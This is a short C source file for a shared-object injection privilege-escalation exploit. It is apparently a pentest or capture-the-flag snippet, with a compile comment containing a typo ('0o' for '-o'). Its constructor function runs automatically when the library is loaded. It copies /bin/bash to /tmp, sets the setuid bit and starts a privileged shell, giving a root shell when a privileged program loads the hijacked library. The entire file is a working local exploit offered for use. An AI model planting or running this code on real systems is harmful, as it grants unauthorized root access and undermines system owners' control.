
// gcc -shared -fPIC 0o output.so so_injection.c
// Remember to save with the same file you are trying to hijack.

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
  system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
